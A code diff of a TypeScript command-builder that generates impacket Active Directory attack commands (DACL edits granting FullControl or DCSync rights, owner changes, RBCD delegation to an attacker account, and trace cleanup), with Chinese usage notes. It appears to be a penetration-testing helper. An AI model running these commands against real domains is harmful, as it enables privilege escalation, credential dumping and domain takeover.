@@ -1,5 +1,5 @@
 import type { Profile, Tool } from '../../../types';
-import { buildImpacketDomainAuth, q, v } from '../../../lib/auth';
+import { buildImpacketDomainAuth, domainDN, q, v } from '../../../lib/auth';
 
 /**
  * impacket AD 攻击类工具 (DACL/Owner/RBCD/机器账户/域提权/NTLM 中继)
@@ -49,7 +49,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'dacledit-read',
         title: '读取目标对象 DACL',
         description: '-action read 打印目标对象 DACL，可用 -principal 过滤特定主体的 ACE',
-        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action read -target ${v('', 'TARGET')}`,
+        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action read -target ${v(p.targetObject, 'TARGET')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份；域名部分用于定位 DC
 -action read: 读取目标对象的 DACL (默认动作)
 -target NAME: 目标对象的 sAMAccountName；也可用 -target-sid SID 或 -target-dn DN 指定
@@ -65,7 +65,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'dacledit-backup',
         title: '备份目标对象 DACL',
         description: '-action backup 将 DACL 序列化保存到文件，供修改后恢复',
-        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action backup -target ${v('', 'TARGET')} -file ${v(p.fileName, 'BACKUP.json')}`,
+        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action backup -target ${v(p.targetObject, 'TARGET')} -file ${v(p.fileName, 'BACKUP.json')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action backup: 备份目标对象的 DACL 到文件
 -target NAME: 目标对象的 sAMAccountName；也可用 -target-sid / -target-dn
@@ -80,7 +80,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'dacledit-restore',
         title: '恢复目标对象 DACL',
         description: '-action restore 从备份文件恢复 DACL，用于攻击后清理痕迹',
-        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action restore -target ${v('', 'TARGET')} -file ${v(p.fileName, 'BACKUP.json')}`,
+        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action restore -target ${v(p.targetObject, 'TARGET')} -file ${v(p.fileName, 'BACKUP.json')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action restore: 从备份文件恢复目标对象的 DACL
 -target NAME: 目标对象的 sAMAccountName；也可用 -target-sid / -target-dn
@@ -95,7 +95,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'dacledit-write-fullcontrol',
         title: '写入 FullControl ACE',
         description: '-action write -rights FullControl 授予主体对目标的完全控制权',
-        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action write -rights FullControl -principal ${v(p.username, 'USER')} -target ${v('', 'TARGET')}`,
+        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action write -rights FullControl -principal ${v(p.username, 'USER')} -target ${v(p.targetObject, 'TARGET')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action write: 在目标 DACL 中新增 ACE
 -principal NAME: ACE 授予的主体 (攻击者控制的账户, sAMAccountName)；也可用 -principal-sid / -principal-dn
@@ -111,7 +111,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'dacledit-write-dcsync',
         title: '写入 DCSync 权限',
         description: '-rights DCSync 授予主体复制权限 (DS-Replication-Get-Changes[-All])，可对域对象 DCSync',
-        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action write -rights DCSync -principal ${v(p.username, 'USER')} -target-dn ${v('', 'DC=DOMAIN,DC=LOCAL')}`,
+        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action write -rights DCSync -principal ${v(p.username, 'USER')} -target-dn ${v(domainDN(p), 'DC=DOMAIN,DC=LOCAL')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action write: 在目标 DACL 中新增 ACE
 -rights DCSync: 写入复制权限组合，之后可用 secretsdump -just-dc 执行 DCSync
@@ -126,7 +126,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'dacledit-remove',
         title: '移除 ACE (清理)',
         description: '-action remove 删除目标 DACL 中指定主体与权限的 ACE',
-        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action remove -rights FullControl -principal ${v(p.username, 'USER')} -target ${v('', 'TARGET')}`,
+        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action remove -rights FullControl -principal ${v(p.username, 'USER')} -target ${v(p.targetObject, 'TARGET')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action remove: 从目标 DACL 中移除匹配主体与权限的 ACE
 -principal NAME: 要移除 ACE 的主体 (攻击者控制的账户)
@@ -149,7 +149,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'owneredit-read',
         title: '读取目标对象 Owner',
         description: '-action read 打印目标对象当前的所有者',
-        build: (p) => `impacket-owneredit ${buildImpacketDomainAuth(p)} -action read -target ${v('', 'TARGET')}`,
+        build: (p) => `impacket-owneredit ${buildImpacketDomainAuth(p)} -action read -target ${v(p.targetObject, 'TARGET')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份；域名部分用于定位 DC
 -action read: 读取目标对象的 Owner 属性
 -target NAME: 目标对象的 sAMAccountName；也可用 -target-sid SID 或 -target-dn DN 指定
@@ -164,7 +164,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'owneredit-write',
         title: '修改目标对象 Owner',
         description: '-action write 将目标对象所有者改为攻击者控制的账户 (需要 WriteOwner 权限)',
-        build: (p) => `impacket-owneredit ${buildImpacketDomainAuth(p)} -action write -new-owner ${v(p.username, 'USER')} -target ${v('', 'TARGET')}`,
+        build: (p) => `impacket-owneredit ${buildImpacketDomainAuth(p)} -action write -new-owner ${v(p.username, 'USER')} -target ${v(p.targetObject, 'TARGET')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action write: 修改目标对象的 Owner 属性
 -new-owner NAME: 新所有者 (攻击者控制的账户, sAMAccountName)；也可用 -new-owner-sid / -new-owner-dn
@@ -188,7 +188,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'rbcd-read',
         title: '读取目标账户 RBCD 配置',
         description: '-action read 查看目标账户当前允许哪些账户委派',
-        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action read -delegate-to ${v('', 'TARGET$')}`,
+        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action read -delegate-to ${v(p.targetObject, 'TARGET$')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份；域名部分用于定位 DC
 -action read: 读取目标账户的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性
 -delegate-to ACCOUNT: 被读取/修改 RBCD 属性的目标账户 (必填，通常是机器账户如 SRV01$)
@@ -203,7 +203,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'rbcd-write',
         title: '写入 RBCD (委派攻击)',
         description: '-action write 允许攻击者控制的账户委派到目标，之后用 getST -impersonate 取票据',
-        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action write -delegate-to ${v('', 'TARGET$')} -delegate-from ${v('', 'EVIL$')}`,
+        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action write -delegate-to ${v(p.targetObject, 'TARGET$')} -delegate-from ${v('', 'EVIL$')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份 (需对目标有写权限)
 -action write: 在目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 中加入委派账户
 -delegate-to ACCOUNT: 被配置 RBCD 的目标账户 (必填，如被控机器 SRV01$)
@@ -218,7 +218,7 @@ export const impacketAdAttackTools: Tool[] = [
         id: 'rbcd-remove',
         title: '移除 RBCD 配置 (清理)',
         description: '-action remove 从目标 RBCD 属性中删除指定委派账户',
-        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action remove -delegate-to ${v('', 'TARGET$')} -delegate-from ${v('', 'EVIL$')}`,
+        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action remove -delegate-to ${v(p.targetObject, 'TARGET$')} -delegate-from ${v('', 'EVIL$')}`,
         usage: `位置参数 identity: domain.local/username[:password]，认证身份
 -action remove: 从目标 RBCD 属性中移除 -delegate-from 指定的账户
 -delegate-to ACCOUNT: 目标账户 (必填)
